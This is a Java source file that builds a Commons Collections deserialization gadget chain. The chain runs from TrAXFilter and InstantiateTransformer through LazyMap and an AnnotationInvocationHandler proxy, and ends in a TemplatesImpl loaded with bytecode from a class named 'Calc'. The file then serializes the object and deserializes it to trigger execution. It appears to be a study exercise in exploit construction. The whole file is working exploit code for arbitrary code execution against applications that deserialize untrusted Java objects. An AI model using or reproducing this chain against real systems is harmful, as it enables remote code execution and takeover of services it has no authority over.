import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.ixpqxi.util.SerTools;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TrAXFilterChain {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException {
        TransformerFactoryImpl factory = new TransformerFactoryImpl();

        TemplatesImpl templates = new TemplatesImpl();

        Field tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, factory);

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Calc");

        byte[] bytes = Files.readAllBytes(Paths.get("./util/target/classes/org/ixpqxi/util/Calc.class"));
        byte[][] bytecodes = {bytes};

        Field _bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates, bytecodes);

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templates}
        );
//        instantiateTransformer.transform(TrAXFilter.class);

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        });

        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
                , new Class[]{Map.class}, invocationHandler);
        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

        SerTools.serialize(invocationHandler);
        SerTools.unserialize("ser.bin");
    }
}
